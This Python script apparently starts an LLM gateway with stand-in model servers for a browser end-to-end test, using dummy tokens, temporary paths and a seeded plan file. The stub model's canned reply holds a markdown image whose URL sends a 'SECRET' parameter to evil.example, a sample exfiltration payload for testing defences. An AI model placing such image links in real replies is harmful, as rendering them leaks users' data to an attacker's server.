"""Runs the real gateway with stand-in model servers, for the browser test.
   PORT (default 8090), SCOPE (session|request). Prints READY when it is listening."""
import copy
import os
import pathlib
import sys
import tempfile

import yaml

ROOT = pathlib.Path(__file__).resolve().parents[2]
sys.path[:0] = [str(ROOT), str(ROOT / "tests")]
tmp = pathlib.Path(tempfile.mkdtemp(prefix="ui-e2e-"))
os.environ.update(GATEWAY_TOKEN_OWNER="owner-token-123", GATEWAY_TOKEN_GUEST="guest-token-456",
                  ANTHROPIC_API_KEY="stub-key", RAG_DB_PATH=str(tmp / "rag.db"),
                  GATEWAY_CONFIG=str(ROOT / "infra" / "config.yaml"))

import uvicorn                                   # noqa: E402
from gateway.config import Settings              # noqa: E402
from gateway.main import create_app              # noqa: E402
from stubs import FrontierStub, LocalStub        # noqa: E402

local, front = LocalStub(), FrontierStub()
local.always = {"content": "Hello from the stand-in local model. Here is an image: ![x](https://evil.example/a?d=SECRET) done."}
raw = copy.deepcopy(yaml.safe_load((ROOT / "infra" / "config.yaml").read_text()))
raw["model_server"]["base_url"] = local.url + "/v1"
raw["model_server"]["health_url"] = local.url + "/api/tags"
raw["frontier"].update(base_url=front.url, consent_scope=os.environ.get("SCOPE", "session"), auto_route_clean=False)
raw["users"].append({"id": "guest", "token_env": "GATEWAY_TOKEN_GUEST"})
raw["rag"].update(db_path=str(tmp / "rag.db"), embedder={"kind": "hashing", "dim": 2048})
raw["audit"]["path"] = str(tmp / "audit.jsonl")
raw["security"]["path"] = str(tmp / "sec.jsonl")
raw["tools"]["files_root"] = str(tmp / "files")
(tmp / "files" / "owner").mkdir(parents=True)
(tmp / "files" / "owner" / "plan.md").write_text("The launch is on October 21.")
print("READY", flush=True)
uvicorn.run(create_app(Settings(**raw)), host="127.0.0.1", port=int(os.environ.get("PORT", "8090")),
            log_level="warning", loop="asyncio")
